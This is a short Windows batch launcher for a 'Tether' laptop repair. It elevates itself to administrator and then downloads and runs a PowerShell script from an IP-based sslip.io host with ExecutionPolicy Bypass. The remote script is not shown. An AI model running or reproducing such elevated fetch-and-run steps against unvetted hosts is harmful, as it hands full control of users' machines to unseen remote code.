@echo off
title Tether LAPTOP-01 repair
chcp 65001 >nul
setlocal
set "PS1_URL=https://8-220-198-26.sslip.io/install/repair-laptop-node.ps1"
set "PS1=%TEMP%\tether-repair-laptop.ps1"

fltmc >nul 2>&1
if errorlevel 1 (
  echo Requesting administrator privileges, click Yes in the UAC prompt...
  powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
  exit /b
)

echo Downloading the repair script...
powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Invoke-WebRequest -UseBasicParsing -Uri '%PS1_URL%' -OutFile '%PS1%' } catch { Write-Host ('download failed: ' + $_.Exception.Message); exit 1 }"
if errorlevel 1 goto :fail

powershell -NoProfile -ExecutionPolicy Bypass -File "%PS1%"
set "RC=%ERRORLEVEL%"
echo.
if not "%RC%"=="0" echo Repair finished with code %RC%. The log above says why.
pause
exit /b %RC%

:fail
echo.
echo Could not download the repair script. Check the network and run this file again.
pause
exit /b 1